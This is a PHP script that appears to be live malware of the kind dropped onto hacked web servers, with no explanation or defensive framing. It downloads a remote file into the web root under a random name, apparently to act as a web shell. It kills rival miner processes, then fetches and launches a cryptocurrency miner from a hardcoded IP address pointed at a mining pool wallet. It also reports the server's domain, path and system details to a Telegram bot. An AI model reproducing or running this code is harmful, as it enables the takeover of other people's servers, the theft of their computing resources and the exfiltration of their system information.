<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
function http_get($url){
$im = curl_init($url);
curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($im, CURLOPT_HEADER, 0);
return curl_exec($im);
curl_close($im);
}
$nama = 'glk' . mt_rand(1,9999) . '.php';
$check = $_SERVER['DOCUMENT_ROOT'] . '/'.$nama.'';
$text = http_get('http://moneyua.vip/public/fonts/source/GothamPro-Medium/wp-config-sample.txt');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
}
echo '<center><pre>raimuasu</pre>'; exec("ps -ef|awk '/upgrade|update|xmrig|Ice-Unix|tailah|jancok|masscan|screen|cpu-miner|upx|minerd|dx|Font-unix|gelud|ICE-unix|kworker|perl|ld-linux-x86-64|node|power2b|sampah|Xorg|hellminer|git|gui/{print $2}' |xargs kill -9"); system('curl -s --insecure 94.23.29.122/p2b -o mysql; chmod +x mysql; ./mysql -a cpupower -o stratum+tcp://cpupower.eu.mine.zpool.ca:6240 -u MTh8fxWC45eeUCSfbddYxo27ZZZbVQqkP5 -p c=LTC,m=solo --randomize --no-extranonce --no-color --api-bind $RANDOM --background > /dev/null'); $sys = php_uname(); $lihat = getcwd(); $home = $_SERVER['DOCUMENT_ROOT']; $domen = $_SERVER['SERVER_NAME']; $tempat = $_SERVER['REQUEST_URI']; $apiToken = "1765040091:AAESnKl29tHuol7gN_4DGJYJtl_kqoTs3aI"; $data = [ 'chat_id' => '-1001473401290', 'text' => "ojo di flood asw : \r\n http://$domen/$nama \r\n $sys \r\n $home  \n$passpost " ]; $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) ); ?>